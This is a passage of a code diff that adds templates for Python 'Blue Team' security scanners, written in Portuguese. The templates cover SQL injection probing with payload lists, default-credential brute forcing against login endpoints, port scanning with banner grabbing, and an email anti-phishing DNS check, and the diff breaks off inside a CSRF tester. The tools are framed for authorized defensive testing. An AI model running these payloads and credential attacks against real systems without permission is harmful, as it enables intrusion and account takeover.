@@ -1537,6 +1537,1829 @@ if __name__ == "__main__":
   },
 
   // ── 7. XSS & Injection Scanner ────────────────────────────────────
+  // ── 8. SQL Injection Scanner ──────────────────────────────────────
+  sql_injection: {
+    id: 'sql_injection',
+    name: 'SQL Injection Scanner',
+    category: 'Injeção',
+    severity: 'critical',
+    description: 'Testa injeção SQL em parâmetros de URL, formulários e headers. Detecta erro-based, time-based blind e boolean-based SQLi.',
+    icon: '🗄️',
+    dependencies: ['requests'],
+    template: (url) => `#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — SQL Injection Scanner                           ║
+║  Propósito: Detectar falhas de SQLi (erro, blind, time)      ║
+║  Alvo: ${url}
+║  Uso: python sql_injection.py [URL]                          ║
+╚══════════════════════════════════════════════════════════════╝
+USO EXCLUSIVO PARA TESTES EM SISTEMAS PRÓPRIOS OU AUTORIZADOS
+"""
+
+import sys, json, time, requests
+from datetime import datetime
+from urllib.parse import urljoin, urlparse, urlencode
+
+requests.packages.urllib3.disable_warnings()
+
+TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
+TIMEOUT = 10
+HEADERS = {"User-Agent": "BlueTeam-SQLiScanner/1.0", "Accept": "application/json,text/html"}
+
+# Payloads de detecção (NÃO destrutivos)
+ERROR_PAYLOADS = [
+    "'", '"', "''", "\\\\", "1' OR '1'='1", '1" OR "1"="1',
+    "1' AND 1=2--", "1 AND 1=2", "' OR 1=1--", '" OR 1=1--',
+    "'; SELECT 1--", "1; DROP TABLE--", "admin'--", "' HAVING 1=1--",
+    "1' ORDER BY 1--", "1' ORDER BY 100--",
+]
+
+TIME_PAYLOADS = [
+    "1; WAITFOR DELAY '0:0:3'--",          # MSSQL
+    "1' AND SLEEP(3)--",                    # MySQL
+    "1; SELECT pg_sleep(3)--",              # PostgreSQL
+    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
+    "1 AND 1=(SELECT 1 FROM PG_SLEEP(3))",
+]
+
+# Erros de banco de dados nos responses
+DB_ERROR_PATTERNS = [
+    "sql syntax", "mysql_fetch", "ora-", "microsoft ole db",
+    "odbc sql", "sqlite", "pg_query", "syntax error",
+    "unclosed quotation mark", "unterminated string",
+    "quoted string not properly terminated",
+    "invalid column name", "column count doesn't match",
+    "supplied argument is not a valid mysql",
+    "you have an error in your sql syntax",
+    "warning: mysql", "jdbc", "sqlexception",
+    "com.mysql", "org.postgresql", "microsoft sql server",
+]
+
+COMMON_PARAMS = [
+    "id", "user", "username", "email", "search", "q", "query",
+    "page", "category", "sort", "order", "filter", "limit",
+    "offset", "token", "key", "ref", "type", "name", "product",
+    "item", "article", "post", "comment", "code", "lang",
+]
+
+COMMON_PATHS = [
+    "/api/users", "/api/products", "/api/items", "/api/posts",
+    "/api/search", "/api/v1/users", "/api/v2/search",
+    "/rest/items", "/graphql", "/api/auth/login",
+]
+
+def check_error_sqli(base, param, payload):
+    url = f"{base}?{param}={requests.utils.quote(payload)}"
+    try:
+        r = requests.get(url, timeout=TIMEOUT, verify=False, headers=HEADERS)
+        body_lower = r.text.lower()
+        for pattern in DB_ERROR_PATTERNS:
+            if pattern in body_lower:
+                return {"found": True, "type": "Error-based SQLi", "pattern": pattern, "param": param, "payload": payload[:40]}
+    except Exception:
+        pass
+    return {"found": False}
+
+def check_time_sqli(base, param, payload, threshold=2.5):
+    url = f"{base}?{param}={requests.utils.quote(payload)}"
+    try:
+        t0 = time.time()
+        requests.get(url, timeout=TIMEOUT + 5, verify=False, headers=HEADERS)
+        elapsed = time.time() - t0
+        if elapsed >= threshold:
+            return {"found": True, "type": "Time-based Blind SQLi", "elapsed": round(elapsed, 2), "param": param, "payload": payload[:40]}
+    except Exception:
+        pass
+    return {"found": False}
+
+def check_boolean_sqli(base, param):
+    try:
+        r_true  = requests.get(f"{base}?{param}=1 AND 1=1", timeout=TIMEOUT, verify=False, headers=HEADERS)
+        r_false = requests.get(f"{base}?{param}=1 AND 1=2", timeout=TIMEOUT, verify=False, headers=HEADERS)
+        if r_true.status_code != r_false.status_code or abs(len(r_true.text) - len(r_false.text)) > 50:
+            return {"found": True, "type": "Boolean-based Blind SQLi",
+                    "true_len": len(r_true.text), "false_len": len(r_false.text), "param": param}
+    except Exception:
+        pass
+    return {"found": False}
+
+def scan_endpoint(base, param):
+    findings = []
+    print(f"  Testing param [{param}]...")
+
+    for payload in ERROR_PAYLOADS[:8]:
+        r = check_error_sqli(base, param, payload)
+        if r["found"]:
+            findings.append(r)
+            print(f"    🔴 Error-based SQLi! Pattern: {r['pattern']}")
+            break
+
+    for payload in TIME_PAYLOADS[:3]:
+        r = check_time_sqli(base, param, payload)
+        if r["found"]:
+            findings.append(r)
+            print(f"    🔴 Time-based SQLi! Delay: {r['elapsed']}s")
+            break
+
+    r = check_boolean_sqli(base, param)
+    if r["found"]:
+        findings.append(r)
+        print(f"    🔴 Boolean-based SQLi! Len diff: {abs(r['true_len'] - r['false_len'])} bytes")
+
+    return findings
+
+def main():
+    base = TARGET_URL.rstrip("/")
+    if not base.startswith("http"):
+        base = "https://" + base
+
+    print(f"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — SQL Injection Scanner                           ║
+╠══════════════════════════════════════════════════════════════╣
+║  Alvo  : {base:<52}║
+║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
+╚══════════════════════════════════════════════════════════════╝
+""")
+
+    all_findings = []
+
+    # Testa parâmetros GET comuns
+    print("[*] Testando parâmetros GET comuns...")
+    for param in COMMON_PARAMS[:15]:
+        findings = scan_endpoint(base, param)
+        all_findings.extend(findings)
+
+    # Testa endpoints de API comuns
+    print()
+    print("[*] Testando endpoints de API...")
+    for path in COMMON_PATHS[:6]:
+        endpoint = base.rstrip("/") + path
+        for param in ["id", "q", "search"][:2]:
+            findings = scan_endpoint(endpoint, param)
+            all_findings.extend(findings)
+
+    # Testa header injection (User-Agent, Referer)
+    print()
+    print("[*] Testando header injection...")
+    for payload in ["'", "1 AND 1=1", "' OR 1=1--"]:
+        try:
+            r = requests.get(base, timeout=TIMEOUT, verify=False,
+                             headers={**HEADERS, "X-Forwarded-For": payload, "Referer": payload})
+            body_lower = r.text.lower()
+            for pattern in DB_ERROR_PATTERNS[:5]:
+                if pattern in body_lower:
+                    all_findings.append({"type": "Header Injection SQLi", "header": "X-Forwarded-For/Referer",
+                                         "payload": payload, "pattern": pattern})
+                    print(f"  🔴 SQLi via header! Pattern: {pattern}")
+                    break
+        except Exception:
+            pass
+
+    print()
+    print("=" * 64)
+    criticals = [f for f in all_findings if "blind" in f.get("type","").lower() or "error" in f.get("type","").lower()]
+    print(f"  RESULTADO: {len(all_findings)} possíveis SQLi detectadas")
+    print(f"  🔴 Críticas: {len(criticals)}")
+
+    if not all_findings:
+        print("  ✅ Nenhuma injeção SQL detectada nos testes realizados")
+    else:
+        print()
+        print("  ⚠️  RECOMENDAÇÕES:")
+        print("     • Use prepared statements / parametrized queries")
+        print("     • Implemente WAF (Web Application Firewall)")
+        print("     • Valide e sanitize TODOS os inputs do usuário")
+        print("     • Implemente rate limiting nas APIs")
+
+    output = {"target": base, "timestamp": datetime.now().isoformat(),
+              "total": len(all_findings), "findings": all_findings}
+    with open("sql_injection_results.json", "w") as f:
+        json.dump(output, f, indent=2, ensure_ascii=False)
+    print(f"\\n[✓] Resultados salvos em: sql_injection_results.json")
+
+if __name__ == "__main__":
+    main()
+`
+  },
+
+  // ── 9. Hydra-Style Credential Tester ──────────────────────────────
+  hydra_bruteforce: {
+    id: 'hydra_bruteforce',
+    name: 'Hydra-Style Credential Tester',
+    category: 'Autenticação',
+    severity: 'high',
+    description: 'Simula ataques Hydra: testa credenciais padrão, senhas fracas e lockout em endpoints de login. Verifica rate limiting e proteções.',
+    icon: '🐉',
+    dependencies: ['requests'],
+    template: (url) => `#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — Hydra-Style Credential Tester                   ║
+║  Propósito: Verificar proteção contra brute force            ║
+║  Alvo: ${url}
+║  Uso: python hydra_bruteforce.py [URL]                       ║
+╚══════════════════════════════════════════════════════════════╝
+APENAS PARA SISTEMAS COM AUTORIZAÇÃO EXPLÍCITA
+"""
+
+import sys, json, time, requests
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+requests.packages.urllib3.disable_warnings()
+
+TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
+TIMEOUT = 8
+DELAY   = 0.3  # delay entre tentativas (segundos)
+HEADERS = {"User-Agent": "BlueTeam-HydraTest/1.0", "Accept": "application/json"}
+
+# Credenciais padrão para verificar (Blue Team wordlist)
+DEFAULT_CREDENTIALS = [
+    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
+    ("admin", "admin123"), ("root", "root"), ("root", "toor"),
+    ("administrator", "administrator"), ("test", "test"),
+    ("user", "user"), ("guest", "guest"), ("demo", "demo"),
+    ("admin", ""), ("admin", "Pass@123"), ("admin", "Admin@123"),
+    ("superadmin", "superadmin"), ("sa", "sa"), ("oracle", "oracle"),
+]
+
+# Endpoints de login comuns
+LOGIN_ENDPOINTS = [
+    "/api/auth/login", "/api/login", "/api/v1/auth",
+    "/auth/login", "/auth/signin", "/login",
+    "/api/token", "/api/auth/token",
+    "/auth/v1/token",  # Supabase
+    "/api/users/login", "/api/session",
+]
+
+def detect_login_endpoint(base):
+    """Detecta qual endpoint de login está disponível."""
+    print("[*] Detectando endpoint de login...")
+    for path in LOGIN_ENDPOINTS:
+        url = base.rstrip("/") + path
+        try:
+            r = requests.post(url, json={"email": "probe@test.com", "password": "probe"},
+                              timeout=TIMEOUT, verify=False, headers=HEADERS)
+            if r.status_code not in [404, 405]:
+                print(f"  ✅ Endpoint encontrado: {path} ({r.status_code})")
+                return url, r.status_code
+        except Exception:
+            pass
+    return None, None
+
+def test_credential(login_url, username, password, attempt_num):
+    """Testa uma credencial e retorna o resultado."""
+    payloads = [
+        {"email": username, "password": password},
+        {"username": username, "password": password},
+        {"login": username, "password": password},
+    ]
+    for payload in payloads:
+        try:
+            t0 = time.time()
+            r = requests.post(login_url, json=payload, timeout=TIMEOUT,
+                              verify=False, headers=HEADERS)
+            elapsed = round((time.time() - t0) * 1000)
+            is_success = (
+                r.status_code in [200, 201] and
+                any(k in r.text.lower() for k in ["token", "access_token", "session", "user", "success"])
+                and r.status_code not in [400, 401, 403, 422]
+            )
+            is_locked = r.status_code == 429 or "too many" in r.text.lower() or "locked" in r.text.lower()
+            return {
+                "attempt": attempt_num, "username": username, "password": password[:3] + "***",
+                "status": r.status_code, "elapsed_ms": elapsed,
+                "success": is_success, "rate_limited": is_locked,
+                "response_len": len(r.text),
+            }
+        except Exception as e:
+            return {"attempt": attempt_num, "username": username, "error": str(e)[:40]}
+    return {"attempt": attempt_num, "username": username, "error": "all payloads failed"}
+
+def check_rate_limiting(login_url):
+    """Verifica se existe rate limiting ativo."""
+    print("[*] Verificando rate limiting (10 requests rápidos)...")
+    results = []
+    for i in range(10):
+        try:
+            r = requests.post(login_url, json={"email": "test@test.com", "password": "wrong"},
+                              timeout=TIMEOUT, verify=False, headers=HEADERS)
+            results.append(r.status_code)
+            if r.status_code == 429 or "too many" in r.text.lower():
+                print(f"  ✅ Rate limiting ativo após {i+1} tentativas (HTTP {r.status_code})")
+                return True
+        except Exception:
+            pass
+        time.sleep(0.05)
+    print(f"  ⚠️  Rate limiting NÃO detectado após 10 tentativas rápidas")
+    return False
+
+def check_lockout(login_url):
+    """Verifica se existe account lockout."""
+    print("[*] Verificando account lockout (5 tentativas inválidas)...")
+    for i in range(5):
+        try:
+            r = requests.post(login_url, json={"email": "admin@test.com", "password": f"wrongpass{i}"},
+                              timeout=TIMEOUT, verify=False, headers=HEADERS)
+            if "locked" in r.text.lower() or "blocked" in r.text.lower():
+                print(f"  ✅ Account lockout ativo após {i+1} tentativas")
+                return True
+        except Exception:
+            pass
+        time.sleep(0.1)
+    print("  ⚠️  Account lockout NÃO detectado")
+    return False
+
+def main():
+    base = TARGET_URL.rstrip("/")
+    if not base.startswith("http"):
+        base = "https://" + base
+
+    print(f"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — Hydra-Style Credential Tester                   ║
+╠══════════════════════════════════════════════════════════════╣
+║  Alvo  : {base:<52}║
+║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
+╚══════════════════════════════════════════════════════════════╝
+""")
+
+    login_url, initial_status = detect_login_endpoint(base)
+    if not login_url:
+        print("  ℹ️  Nenhum endpoint de login padrão detectado.")
+        login_url = base + "/api/auth/login"
+
+    print()
+    has_rate_limit = check_rate_limiting(login_url)
+    time.sleep(1)
+    has_lockout = check_lockout(login_url)
+
+    print()
+    print(f"[*] Testando {len(DEFAULT_CREDENTIALS)} credenciais padrão...")
+    findings = []
+    for i, (user, pw) in enumerate(DEFAULT_CREDENTIALS, 1):
+        result = test_credential(login_url, user, pw, i)
+        if result.get("success"):
+            findings.append(result)
+            print(f"  🔴 CREDENCIAL PADRÃO ACEITA! {user}:{pw[:3]}***")
+        elif result.get("rate_limited"):
+            print(f"  ✅ Rate limited na tentativa {i}")
+            break
+        time.sleep(DELAY)
+
+    print()
+    print("=" * 64)
+    print(f"  Rate Limiting : {'✅ Ativo' if has_rate_limit else '🔴 AUSENTE'}")
+    print(f"  Account Lockout: {'✅ Ativo' if has_lockout else '🔴 AUSENTE'}")
+    print(f"  Credenciais Padrão Aceitas: {len(findings)}")
+    if not has_rate_limit:
+        print()
+        print("  ⚠️  RECOMENDAÇÕES:")
+        print("     • Implementar rate limiting (ex: 5 tentativas / 15min)")
+        print("     • Implementar CAPTCHA após 3 tentativas falhas")
+        print("     • Ativar account lockout temporário")
+        print("     • Alertas em tempo real para brute force")
+
+    output = {"target": base, "login_url": login_url,
+              "timestamp": datetime.now().isoformat(),
+              "has_rate_limit": has_rate_limit, "has_lockout": has_lockout,
+              "credentials_found": findings}
+    with open("hydra_test_results.json", "w") as f:
+        json.dump(output, f, indent=2, ensure_ascii=False)
+    print(f"\\n[✓] Resultados em: hydra_test_results.json")
+
+if __name__ == "__main__":
+    main()
+`
+  },
+
+  // ── 10. Metasploit-Style Service Enumeration ───────────────────────
+  metasploit_enum: {
+    id: 'metasploit_enum',
+    name: 'Metasploit-Style Service Enumeration',
+    category: 'Reconhecimento',
+    severity: 'medium',
+    description: 'Enumera serviços, portas abertas, banners, tecnologias e CVEs conhecidos. Equivalente ao Metasploit scanner/discovery em Python puro.',
+    icon: '🎯',
+    dependencies: ['requests'],
+    template: (url) => `#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — Metasploit-Style Service Enumeration            ║
+║  Propósito: Enumerar serviços e detectar versões expostas    ║
+║  Alvo: ${url}
+║  Uso: python metasploit_enum.py [URL]                        ║
+╚══════════════════════════════════════════════════════════════╝
+"""
+
+import sys, json, socket, time, requests
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from urllib.parse import urlparse
+
+requests.packages.urllib3.disable_warnings()
+
+TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
+TIMEOUT = 5
+
+# Portas e serviços comuns a escanear
+COMMON_PORTS = {
+    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
+    53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
+    443: "HTTPS", 445: "SMB", 1433: "MSSQL", 1521: "Oracle",
+    2375: "Docker (unsecured!)", 2376: "Docker TLS",
+    3000: "Dev Server", 3306: "MySQL", 4243: "Docker",
+    5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
+    7000: "Cassandra", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
+    8888: "Jupyter", 9000: "Portainer/PHP-FPM",
+    9090: "Prometheus", 9200: "Elasticsearch",
+    27017: "MongoDB", 51820: "WireGuard",
+}
+
+# Padrões de banner para fingerprinting
+BANNER_SIGNATURES = {
+    "nginx": "Nginx Web Server",
+    "apache": "Apache HTTP Server",
+    "microsoft-iis": "Microsoft IIS",
+    "cloudflare": "Cloudflare CDN",
+    "vercel": "Vercel Platform",
+    "aws": "Amazon Web Services",
+    "php/": "PHP (version exposed!)",
+    "python/": "Python (version exposed!)",
+    "node.js": "Node.js",
+    "express": "Express.js",
+    "tomcat": "Apache Tomcat",
+    "jboss": "JBoss",
+    "jenkins": "Jenkins CI/CD",
+    "grafana": "Grafana",
+    "prometheus": "Prometheus",
+}
+
+# Paths que expõem informações de versão
+VERSION_PATHS = [
+    "/api/version", "/version", "/api/health", "/health",
+    "/_version", "/status", "/api/status", "/info",
+    "/api/info", "/actuator/info", "/actuator/health",
+    "/server-info", "/api/server-info",
+    "/.well-known/security.txt",
+    "/robots.txt", "/sitemap.xml",
+    "/wp-json/wp/v2/", "/xmlrpc.php",
+]
+
+def scan_port(host, port, service):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(TIMEOUT)
+        result = sock.connect_ex((host, port))
+        sock.close()
+        if result == 0:
+            return {"port": port, "service": service, "open": True}
+    except Exception:
+        pass
+    return {"port": port, "service": service, "open": False}
+
+def grab_banner(host, port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
+        sock.connect((host, port))
+        sock.send(b"HEAD / HTTP/1.0\\r\\n\\r\\n")
+        banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
+        sock.close()
+        return banner[:200]
+    except Exception:
+        return ""
+
+def get_http_fingerprint(base):
+    findings = []
+    try:
+        r = requests.get(base, timeout=TIMEOUT, verify=False,
+                         headers={"User-Agent": "BlueTeam-Recon/1.0"})
+        server = r.headers.get("Server", "")
+        powered_by = r.headers.get("X-Powered-By", "")
+        via = r.headers.get("Via", "")
+
+        for sig, name in BANNER_SIGNATURES.items():
+            if sig.lower() in (server + powered_by + via + r.text[:500]).lower():
+                findings.append({"type": "Technology", "name": name,
+                                  "source": "headers+body", "severity": "INFO"})
+
+        if server:
+            findings.append({"type": "Server Header", "value": server,
+                              "severity": "MEDIUM" if "/" in server else "INFO"})
+        if powered_by:
+            findings.append({"type": "X-Powered-By (version exposed!)", "value": powered_by,
+                              "severity": "HIGH"})
+    except Exception as e:
+        findings.append({"type": "HTTP Error", "error": str(e)[:40]})
+    return findings
+
+def check_version_paths(base):
+    exposures = []
+    print("[*] Verificando endpoints que expõem versões...")
+    for path in VERSION_PATHS:
+        url = base.rstrip("/") + path
+        try:
+            r = requests.get(url, timeout=TIMEOUT, verify=False,
+                             headers={"User-Agent": "BlueTeam-Recon/1.0"})
+            if r.status_code == 200:
+                body = r.text[:300]
+                print(f"  ✅ Acessível: {path} ({r.status_code}) — {len(r.text)} bytes")
+                exposures.append({"path": path, "status": r.status_code, "preview": body[:100]})
+        except Exception:
+            pass
+    return exposures
+
+def main():
+    base = TARGET_URL.rstrip("/")
+    if not base.startswith("http"):
+        base = "https://" + base
+    parsed = urlparse(base)
+    host = parsed.hostname or parsed.netloc
+
+    print(f"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — Metasploit-Style Service Enumeration            ║
+╠══════════════════════════════════════════════════════════════╣
+║  Alvo  : {base:<52}║
+║  Host  : {host:<52}║
+║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
+╚══════════════════════════════════════════════════════════════╝
+""")
+
+    # Port scan
+    print("[*] Escaneando portas comuns...")
+    open_ports = []
+    with ThreadPoolExecutor(max_workers=20) as exe:
+        futures = {exe.submit(scan_port, host, port, svc): (port, svc)
+                   for port, svc in COMMON_PORTS.items()}
+        for f in as_completed(futures):
+            r = f.result()
+            if r["open"]:
+                open_ports.append(r)
+                danger = "🔴" if r["service"] in ["Docker (unsecured!)", "Redis", "MongoDB", "Elasticsearch"] else "ℹ️"
+                print(f"  {danger} Port {r['port']:5}/tcp OPEN — {r['service']}")
+
+    if not open_ports:
+        print("  ✅ Nenhuma porta inesperada aberta")
+
+    # HTTP fingerprint
+    print()
+    print("[*] Fingerprinting HTTP...")
+    http_findings = get_http_fingerprint(base)
+    for f in http_findings:
+        icon = "🔴" if f.get("severity") == "HIGH" else "ℹ️"
+        print(f"  {icon} {f['type']}: {f.get('value', f.get('name', ''))}")
+
+    # Version paths
+    print()
+    version_exposures = check_version_paths(base)
+
+    print()
+    print("=" * 64)
+    dangerous = [p for p in open_ports if "unsecured" in p["service"] or p["port"] in [6379, 27017, 9200]]
+    print(f"  Portas abertas: {len(open_ports)} | Perigosas: {len(dangerous)}")
+    print(f"  Endpoints de versão expostos: {len(version_exposures)}")
+    if dangerous:
+        print()
+        print("  🔴 PORTAS CRÍTICAS EXPOSTAS — feche imediatamente no firewall!")
+
+    output = {"target": base, "host": host, "timestamp": datetime.now().isoformat(),
+              "open_ports": open_ports, "http_fingerprint": http_findings,
+              "version_exposures": version_exposures}
+    with open("metasploit_enum_results.json", "w") as f:
+        json.dump(output, f, indent=2, ensure_ascii=False)
+    print(f"\\n[✓] Resultados em: metasploit_enum_results.json")
+
+if __name__ == "__main__":
+    main()
+`
+  },
+
+  // ── 11. Phishing & Email Security Analyzer ─────────────────────────
+  phishing_analyzer: {
+    id: 'phishing_analyzer',
+    name: 'Phishing & Email Security Analyzer',
+    category: 'Phishing',
+    severity: 'high',
+    description: 'Analisa configurações anti-phishing: SPF, DKIM, DMARC, BIMI. Detecta domínios typosquatting e URLs suspeitas no site.',
+    icon: '🎣',
+    dependencies: ['requests'],
+    template: (url) => `#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — Phishing & Email Security Analyzer              ║
+║  Propósito: Verificar proteções anti-phishing                ║
+║  Alvo: ${url}
+║  Uso: python phishing_analyzer.py [URL]                      ║
+╚══════════════════════════════════════════════════════════════╝
+"""
+
+import sys, json, socket, re, requests
+from datetime import datetime
+from urllib.parse import urlparse
+
+requests.packages.urllib3.disable_warnings()
+
+TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
+TIMEOUT = 8
+
+def get_domain(url):
+    parsed = urlparse(url if url.startswith("http") else "https://" + url)
+    return parsed.hostname or parsed.netloc
+
+def check_spf(domain):
+    """Verifica registro SPF via DNS TXT."""
+    try:
+        import dns.resolver
+        answers = dns.resolver.resolve(domain, 'TXT')
+        for r in answers:
+            txt = r.to_text().strip('"')
+            if txt.startswith("v=spf1"):
+                has_all = "-all" in txt or "~all" in txt
+                hard_fail = "-all" in txt
+                return {"present": True, "record": txt[:100],
+                        "hard_fail": hard_fail, "soft_fail": "~all" in txt,
+                        "status": "OK" if hard_fail else "WARN"}
+        return {"present": False, "status": "FAIL", "issue": "SPF record not found"}
+    except ImportError:
+        # Fallback sem dnspython
+        return check_spf_via_doh(domain)
+    except Exception as e:
+        return {"present": False, "error": str(e)[:40], "status": "ERROR"}
+
+def check_spf_via_doh(domain):
+    """Fallback: verifica SPF via DNS-over-HTTPS (Cloudflare DoH)."""
+    try:
+        r = requests.get(f"https://cloudflare-dns.com/dns-query?name={domain}&type=TXT",
+                         headers={"Accept": "application/dns-json"}, timeout=TIMEOUT)
+        data = r.json()
+        for ans in data.get("Answer", []):
+            txt = ans.get("data", "").strip('"')
+            if "v=spf1" in txt:
+                return {"present": True, "record": txt[:100],
+                        "hard_fail": "-all" in txt, "status": "OK" if "-all" in txt else "WARN"}
+        return {"present": False, "status": "FAIL"}
+    except Exception as e:
+        return {"present": False, "error": str(e)[:40]}
+
+def check_dmarc(domain):
+    """Verifica DMARC via DoH."""
+    try:
+        r = requests.get(f"https://cloudflare-dns.com/dns-query?name=_dmarc.{domain}&type=TXT",
+                         headers={"Accept": "application/dns-json"}, timeout=TIMEOUT)
+        data = r.json()
+        for ans in data.get("Answer", []):
+            txt = ans.get("data", "").strip('"')
+            if "v=DMARC1" in txt:
+                policy = re.search(r'p=(\\w+)', txt)
+                p = policy.group(1) if policy else "none"
+                return {"present": True, "record": txt[:150], "policy": p,
+                        "status": "OK" if p in ["quarantine", "reject"] else "WARN"}
+        return {"present": False, "status": "FAIL", "issue": "DMARC not configured"}
+    except Exception as e:
+        return {"present": False, "error": str(e)[:40]}
+
+def check_bimi(domain):
+    """Verifica BIMI (Brand Indicators for Message Identification)."""
+    try:
+        r = requests.get(f"https://cloudflare-dns.com/dns-query?name=default._bimi.{domain}&type=TXT",
+                         headers={"Accept": "application/dns-json"}, timeout=TIMEOUT)
+        data = r.json()
+        for ans in data.get("Answer", []):
+            txt = ans.get("data", "").strip('"')
+            if "v=BIMI1" in txt:
+                return {"present": True, "record": txt[:100], "status": "OK"}
+        return {"present": False, "status": "INFO", "note": "BIMI not configured (optional)"}
+    except Exception:
+        return {"present": False}
+
+def check_typosquatting(domain):
+    """Gera variações typosquatting comuns e verifica se estão registradas."""
+    base = domain.split(".")[0]
+    tld = ".".join(domain.split(".")[1:])
+    common_typos = [
+        base.replace("a", "4"), base.replace("o", "0"), base.replace("i", "1"),
+        base + "-login", base + "-secure", base + "-official",
+        base.replace("l", "1"), "www" + base, base + tld.replace(".", ""),
+    ]
+    registered = []
+    for typo in common_typos[:6]:
+        fake_domain = f"{typo}.{tld}"
+        try:
+            socket.gethostbyname(fake_domain)
+            registered.append({"domain": fake_domain, "resolves": True, "risk": "HIGH"})
+            print(f"  ⚠️  Domínio typosquatting registrado: {fake_domain}")
+        except socket.gaierror:
+            pass
+    return registered
+
+def check_external_links(base):
+    """Verifica links externos no site que podem indicar phishing."""
+    suspicious = []
+    try:
+        r = requests.get(base, timeout=TIMEOUT, verify=False,
+                         headers={"User-Agent": "BlueTeam-PhishingAnalyzer/1.0"})
+        links = re.findall(r'href=["\\'](https?://[^"\\'>]+)', r.text)
+        current_domain = get_domain(base)
+        for link in links[:50]:
+            link_domain = get_domain(link)
+            if link_domain and link_domain != current_domain:
+                if any(kw in link_domain for kw in ["login", "secure", "account", "verify", "update"]):
+                    suspicious.append({"url": link[:100], "domain": link_domain, "reason": "suspicious keyword"})
+    except Exception:
+        pass
+    return suspicious
+
+def main():
+    base = TARGET_URL.rstrip("/")
+    if not base.startswith("http"):
+        base = "https://" + base
+    domain = get_domain(base)
+
+    print(f"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — Phishing & Email Security Analyzer              ║
+╠══════════════════════════════════════════════════════════════╣
+║  Alvo  : {base:<52}║
+║  Domínio: {domain:<51}║
+║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
+╚══════════════════════════════════════════════════════════════╝
+""")
+
+    issues = []
+
+    print("[*] Verificando SPF...")
+    spf = check_spf(domain)
+    icon = "✅" if spf.get("status") == "OK" else ("⚠️" if spf.get("status") == "WARN" else "🔴")
+    print(f"  {icon} SPF: {'Presente' if spf.get('present') else 'AUSENTE'}" +
+          (f" — {spf.get('record','')[:60]}" if spf.get("record") else ""))
+    if spf.get("status") != "OK":
+        issues.append("SPF ausente ou sem hard fail (-all)")
+
+    print()
+    print("[*] Verificando DMARC...")
+    dmarc = check_dmarc(domain)
+    icon = "✅" if dmarc.get("status") == "OK" else "🔴"
+    print(f"  {icon} DMARC: {'Presente' if dmarc.get('present') else 'AUSENTE'}" +
+          (f" — policy={dmarc.get('policy')}" if dmarc.get("policy") else ""))
+    if dmarc.get("status") != "OK":
+        issues.append(f"DMARC ausente ou policy=none (emails podem ser forjados!)")
+
+    print()
+    print("[*] Verificando BIMI...")
+    bimi = check_bimi(domain)
+    print(f"  {'✅' if bimi.get('present') else 'ℹ️'} BIMI: {'Configurado' if bimi.get('present') else 'Não configurado (opcional)'}")
+
+    print()
+    print("[*] Verificando typosquatting...")
+    typos = check_typosquatting(domain)
+    if not typos:
+        print("  ✅ Nenhum domínio typosquatting detectado")
+
+    print()
+    print("[*] Verificando links suspeitos no site...")
+    suspicious_links = check_external_links(base)
+    if suspicious_links:
+        for link in suspicious_links[:5]:
+            print(f"  ⚠️  Link suspeito: {link['url'][:80]}")
+    else:
+        print("  ✅ Nenhum link externo suspeito detectado")
+
+    print()
+    print("=" * 64)
+    if issues:
+        print("  🔴 PROBLEMAS CRÍTICOS:")
+        for issue in issues:
+            print(f"     • {issue}")
+        print()
+        print("  RECOMENDAÇÕES:")
+        print("     • Configure SPF com -all (hard fail)")
+        print("     • Configure DMARC com policy=reject")
+        print("     • Monitore domínios typosquatting")
+        print("     • Implemente BIMI com certificado VMC")
+    else:
+        print("  ✅ Configurações anti-phishing adequadas!")
+
+    output = {"target": base, "domain": domain, "timestamp": datetime.now().isoformat(),
+              "spf": spf, "dmarc": dmarc, "bimi": bimi,
+              "typosquatting": typos, "suspicious_links": suspicious_links}
+    with open("phishing_analysis_results.json", "w") as f:
+        json.dump(output, f, indent=2, ensure_ascii=False)
+    print(f"\\n[✓] Resultados em: phishing_analysis_results.json")
+
+if __name__ == "__main__":
+    main()
+`
+  },
+
+  // ── 12. CSRF Token Tester ─────────────────────────────────────────
+  csrf_tester: {
+    id: 'csrf_tester',
+    name: 'CSRF Token Tester',
+    category: 'Autenticação',
+    severity: 'high',
+    description: 'Testa proteção CSRF: verifica tokens, SameSite cookies, CORS preflight e headers de origem em operações de estado.',
+    icon: '🔄',
+    dependencies: ['requests'],
+    template: (url) => `#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — CSRF Token Tester                               ║
+║  Propósito: Verificar proteção contra CSRF                   ║
+║  Alvo: ${url}
+║  Uso: python csrf_tester.py [URL]                            ║
+╚══════════════════════════════════════════════════════════════╝
+"""
+
+import sys, json, re, requests
+from datetime import datetime
+
